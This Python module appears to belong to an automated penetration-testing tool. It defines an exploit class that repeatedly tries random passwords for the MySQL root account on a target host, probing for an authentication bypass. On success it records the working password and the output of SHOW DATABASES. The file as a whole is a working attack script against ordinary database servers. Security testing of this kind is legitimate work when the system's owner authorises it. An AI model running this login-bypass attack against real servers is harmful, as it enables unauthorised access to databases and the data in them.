from Metode import *
""" import re
import keyring """
import subprocess
import random
import string
import time

class CExploit(Exploit):

    def __init__(self):
        super().__init__()
        self._ipAddr = ""
        self._user = "root"
        self._max_attempts = 1000

    def generate_password(self, length=8):
        return ''.join(random.choices(string.ascii_letters + string.digits, k=length))

    def makePayload(self, params=list):
        self._ipAddr = params[0][0]
        

    def startExploit(self):
        """ print(f"Target IP : {self.targets[0][0]}")
        print(f"Target Port : {self.targets[0][1]}") """
        for attempt in range(1, self._max_attempts + 1):
            password = self.generate_password()
            self.attkCommand= [
                "mysql",
                f"--host={self._ipAddr}",
                "-u", self._user,
                f"--password={password}",
                "-e", "SHOW DATABASES;"
            ]

            #print(f"[{attempt}] Trying to password bypass: {password}")
            if attempt == 1: print("\nPlease wait... AutoPentest is attempting a password bypass.")
            process = subprocess.Popen(self.attkCommand, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
            stdout, stderr = process.communicate()

            if process.returncode == 0:
                with open(f"{self.outExpFile}{self._ipAddr}_exploit.txt", "w") as f:
                    f.write("\n[!!!] VULNERABILITY DETECTED: Login succeeded without a valid password.\n")
                    f.write(f"[+] Target IP: {self._ipAddr}\n")
                    f.write(f"[+] Password bypass: {password}\n")
                    f.write(f"[+] Number of attempts: {attempt}\n")
                    f.write("[+] MySQL Output:")
                    f.write(stdout.decode())
                print("\n[!!!] VULNERABILITY DETECTED: Login succeeded without a valid password.")
                print("[+] Target IP:", self._ipAddr)
                print("[+] Password bypass:", password)
                print("[+] Number of attempts:",attempt)
                print("[+] MySQL Output:")
                print(stdout.decode())
                break
            else:
                err = stderr.decode()
                if "Access denied" not in err:
                    with open(f"{self.outExpFile}{self._ipAddr}_exploit_error.txt", "w") as f:
                        f.write(f"[?] Weird Respon : {err.strip()}")
                    print(f"[?] Weird Respon : {err.strip()}")
            time.sleep(0.1)  # Jeda untuk menghindari overload server

        else:
            print("\n[-] AutoPentest Failed to perform bypass the password after ", self._max_attempts, " attempts.")
